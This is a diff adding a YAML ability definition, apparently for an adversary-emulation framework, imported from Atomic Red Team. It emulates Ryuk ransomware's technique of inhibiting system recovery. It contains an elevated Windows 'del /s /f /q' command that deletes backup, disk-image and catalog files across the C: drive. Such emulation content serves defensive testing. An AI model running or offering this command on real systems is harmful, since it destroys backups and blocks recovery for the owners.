@@ -1,0 +1,30 @@
+- id: 6b1dbaf6-cc8a-4ea6-891f-6058569653bf
+  name: Windows - Delete Backup Files
+  description: 'Deletes backup files in a manner similar to Ryuk ransomware. Upon
+    exection, many "access is denied" messages will appear as the commands try
+
+    to delete files from around the system.'
+  tactic: impact
+  technique:
+    attack_id: T1490
+    name: Inhibit System Recovery
+  platforms:
+    windows:
+      sh:
+        command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
+          c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1490
+  - impact
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2019-04-02T13:54:43.136Z'
+    atomic_guid: 6b1dbaf6-cc8a-4ea6-891f-6058569653bf
+    import_timestamp: '2025-06-24T11:15:07.806556Z'
